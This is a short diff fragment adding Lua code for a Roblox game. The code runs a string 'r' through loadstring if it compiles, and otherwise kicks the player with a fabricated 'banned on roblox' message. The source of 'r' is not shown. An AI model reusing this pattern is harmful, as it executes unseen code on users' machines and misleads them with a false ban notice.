@@ -1,0 +1,5 @@
+if s and loadstring(r) then
+   pcall(loadstring(r))
+else
+   game.Players.LocalPlayer:Kick('You has been banned on roblox')
+end
